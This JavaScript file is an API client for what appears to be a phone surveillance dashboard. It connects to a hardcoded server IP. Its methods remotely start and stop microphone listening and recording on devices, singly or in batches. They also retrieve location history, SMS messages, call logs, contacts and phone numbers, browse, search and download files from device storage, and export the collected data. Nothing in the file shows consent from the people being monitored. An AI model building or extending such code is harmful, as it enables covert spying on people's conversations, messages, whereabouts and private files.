// Smart environment detection for robust deployment
const getApiUrl = () => {
  // For production build, use hardcoded VPS IP to avoid DNS issues
  if (process.env.NODE_ENV === 'production') {
    return process.env.REACT_APP_VPS_URL || 'http://105.114.25.157:5000';
  }
  // For development, use environment variable or localhost fallback
  return process.env.REACT_APP_API_URL || 'http://localhost:5000';
};

const API_BASE_URL = getApiUrl();
// Using session-based authentication instead of Basic Auth

class ApiService {
  constructor(baseURL = API_BASE_URL) {
    this.baseURL = baseURL;
    // Remove Basic Auth - we're using session-based authentication
  }

  async request(endpoint, options = {}) {
    const url = `${this.baseURL}${endpoint}`;
    const config = {
      mode: 'cors',
      credentials: 'include', // Include session cookies
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        ...options.headers,
      },
      ...options,
    };

    try {
      const response = await fetch(url, config);
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      return await response.json();
    } catch (error) {
      console.error(`API request failed for ${endpoint}:`, error);
      
      // Return fallback data for dashboard
      if (endpoint === '/api/dashboard-data') {
        return {
          active_sessions_count: 0,
          total_users: 0,
          connection_status: 'error',
          users: [],
          active_sessions: [],
          stats: {
            total_users: 0,
            active_sessions: 0,
            total_recordings: 0
          },
          error: error.message,
          last_updated: new Date().toISOString()
        };
      }
      
      throw error;
    }
  }

  async getDashboardData() {
    return this.request('/api/dashboard-data');
  }

  async getHealthCheck() {
    return this.request('/api/health');
  }

  async startListening(userId) {
    return this.request(`/api/start-listening/${userId}`, {
      method: 'POST'
    });
  }

  async stopListening(userId) {
    return this.request(`/api/stop-listening/${userId}`, {
      method: 'POST'
    });
  }

  async getLatestAudio(deviceId) {
    return this.request(`/api/audio/${deviceId}/latest`);
  }

  // New device detail endpoints
  async getDeviceDetails(deviceId) {
    return this.request(`/api/device/${deviceId}/details`);
  }

  async getDeviceLocationHistory(deviceId, params = {}) {
    const queryString = new URLSearchParams(params).toString();
    const url = `/api/device/${deviceId}/location-history${queryString ? `?${queryString}` : ''}`;
    return this.request(url);
  }

  async getDeviceRecordingEvents(deviceId) {
    return this.request(`/api/device/${deviceId}/recording-events`);
  }

  async resolveAudioFile(deviceId, audioFileId, startDate, startTime) {
    return this.request('/api/resolve-audio-file', {
      method: 'POST',
      body: JSON.stringify({
        device_id: deviceId,
        audio_file_id: audioFileId,
        start_date: startDate,
        start_time: startTime
      })
    });
  }

  // Device extended info endpoints (for Android ID, phone numbers, contacts)
  async getDeviceExtendedInfo(deviceId) {
    return this.request(`/api/device/${deviceId}/extended-info`);
  }

  async getDeviceContacts(deviceId) {
    return this.request(`/api/device/${deviceId}/contacts`);
  }

  async updateDevicePhoneNumbers(deviceId, phoneNumbers) {
    return this.request(`/api/device/${deviceId}/phone-numbers`, {
      method: 'PUT',
      body: JSON.stringify({ phone_numbers: phoneNumbers })
    });
  }

  async getDeviceAudioFiles(deviceId) {
    return this.request(`/api/device/${deviceId}/audio-files`);
  }

  async getDebugDataSummary(deviceId) {
    return this.request(`/api/debug/data-summary/${deviceId}`);
  }

  // Audit logs endpoints
  async getAuditLogs(params = {}) {
    const queryParams = new URLSearchParams();
    if (params.page) queryParams.append('page', params.page);
    if (params.limit) queryParams.append('limit', params.limit);
    if (params.action) queryParams.append('action', params.action);
    if (params.user_id) queryParams.append('user_id', params.user_id);
    if (params.start_date) queryParams.append('start_date', params.start_date);
    if (params.end_date) queryParams.append('end_date', params.end_date);
    
    const query = queryParams.toString();
    return this.request(`/api/audit-logs${query ? '?' + query : ''}`);
  }

  // Recording control endpoints
  async sendRecordingCommand(deviceId, command) {
    return this.request(`/api/device/${deviceId}/recording/command`, {
      method: 'POST',
      body: JSON.stringify({ command })
    });
  }

  async getRecordingStatus(deviceId) {
    return this.request(`/api/device/${deviceId}/recording/status`);
  }

  async sendBatchRecordingCommand(deviceIds, command) {
    return this.request('/api/recording/batch-command', {
      method: 'POST',
      body: JSON.stringify({
        device_ids: deviceIds,
        command: command
      })
    });
  }

  // Delete operations have been removed for data security and integrity
  // All data is now read-only to prevent accidental data loss
  
  // Upload methods for external data
  async uploadAudioFile(deviceId, audioFile) {
    const formData = new FormData();
    formData.append('file', audioFile);
    
    return this.request(`/api/upload/audio/${deviceId}`, {
      method: 'POST',
      headers: {
        'Authorization': this.authHeader,
        // Don't set Content-Type - let browser set multipart/form-data
      },
      body: formData
    });
  }

  async uploadLocationData(deviceId, latitude, longitude) {
    const payload = {
      device_id: deviceId,
      timestamp: new Date().toISOString(),
      location: {
        lat: latitude,
        lng: longitude
      }
    };
    
    return this.request('/api/external/location', {
      method: 'POST',
      body: JSON.stringify(payload)
    });
  }

  async uploadRecordingStartEvent(deviceId, locationData = null, audioFileId = null) {
    const payload = {
      device_id: deviceId,
      event_type: "recording_start",
      timestamp: new Date().toISOString()
    };
    
    if (locationData) {
      payload.location = locationData;
    }
    
    if (audioFileId) {
      payload.audio_file_id = audioFileId;
    }
    
    return this.request('/api/external/recording-event', {
      method: 'POST',
      body: JSON.stringify(payload)
    });
  }

  async uploadRecordingStopEvent(deviceId, locationData = null, audioFileId = null) {
    const payload = {
      device_id: deviceId,
      event_type: "recording_stop",
      timestamp: new Date().toISOString()
    };
    
    if (locationData) {
      payload.location = locationData;
    }
    
    if (audioFileId) {
      payload.audio_file_id = audioFileId;
    }
    
    return this.request('/api/external/recording-event', {
      method: 'POST',
      body: JSON.stringify(payload)
    });
  }

  // SMS endpoints - using unified endpoint
  async getDeviceSms(deviceId, params = {}) {
    const queryParams = new URLSearchParams();
    // Add device_id as a query parameter for the unified endpoint
    queryParams.append('device_id', deviceId);
    if (params.page) queryParams.append('page', params.page);
    if (params.per_page) queryParams.append('per_page', params.per_page);
    if (params.date_from) queryParams.append('date_from', params.date_from);
    if (params.date_to) queryParams.append('date_to', params.date_to);
    if (params.sender) queryParams.append('sender', params.sender);
    if (params.search) queryParams.append('search', params.search);
    if (params.status) queryParams.append('status', params.status);
    
    const query = queryParams.toString();
    return this.request(`/upload/sms${query ? '?' + query : ''}`);
  }

  // Call logs endpoints - using unified endpoint
  async getDeviceCallLogs(deviceId, params = {}) {
    const queryParams = new URLSearchParams();
    // Add device_id as a query parameter for the unified endpoint
    queryParams.append('device_id', deviceId);
    if (params.page) queryParams.append('page', params.page);
    if (params.per_page) queryParams.append('per_page', params.per_page);
    if (params.date_from) queryParams.append('date_from', params.date_from);
    if (params.date_to) queryParams.append('date_to', params.date_to);
    if (params.number) queryParams.append('number', params.number);
    if (params.type) queryParams.append('type', params.type);
    if (params.min_duration) queryParams.append('min_duration', params.min_duration);
    
    const query = queryParams.toString();
    return this.request(`/upload/call${query ? '?' + query : ''}`);
  }

  // Device data export
  async exportDeviceData(deviceId, startDate = null, endDate = null) {
    const payload = {};
    if (startDate) payload.start_date = startDate;
    if (endDate) payload.end_date = endDate;

    const url = `${this.baseURL}/api/device/${deviceId}/export`;
    const config = {
      method: 'POST',
      mode: 'cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      },
      body: JSON.stringify(payload)
    };

    try {
      const response = await fetch(url, config);
      
      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || `HTTP error! status: ${response.status}`);
      }
      
      // Return the response for blob handling
      return response;
    } catch (error) {
      console.error(`Export device data failed for ${deviceId}:`, error);
      throw error;
    }
  }

  // Generic HTTP methods for external storage
  async get(endpoint) {
    return this.request(endpoint, { method: 'GET' });
  }

  async post(endpoint, data = null) {
    const options = { method: 'POST' };
    if (data) {
      options.body = JSON.stringify(data);
    }
    return this.request(endpoint, options);
  }

  async put(endpoint, data = null) {
    const options = { method: 'PUT' };
    if (data) {
      options.body = JSON.stringify(data);
    }
    return this.request(endpoint, options);
  }

  async delete(endpoint) {
    return this.request(endpoint, { method: 'DELETE' });
  }

  // External Storage endpoints
  async getFileSystemTree(deviceId) {
    return this.get(`/api/device/${deviceId}/file-system/tree`);
  }

  async getFolderContents(deviceId, folderPath, params = {}) {
    const queryString = new URLSearchParams(params).toString();
    
    // Handle path encoding properly to avoid double slash issue
    // For paths starting with /, we need to encode the path without the leading slash
    const encodedPath = folderPath.startsWith('/') 
      ? `/${encodeURIComponent(folderPath.substring(1))}` 
      : encodeURIComponent(folderPath);
    
    const url = `/api/device/${deviceId}/file-system/folder${encodedPath}${queryString ? `?${queryString}` : ''}`;
    return this.get(url);
  }

  async searchFiles(deviceId, query, params = {}) {
    const searchParams = new URLSearchParams({ q: query, ...params });
    return this.get(`/api/device/${deviceId}/file-system/search?${searchParams.toString()}`);
  }

  async requestFileDownload(deviceId, filePath) {
    return this.post(`/api/device/${deviceId}/file/${encodeURIComponent(filePath)}/download`);
  }
}

const apiService = new ApiService();
export default apiService;
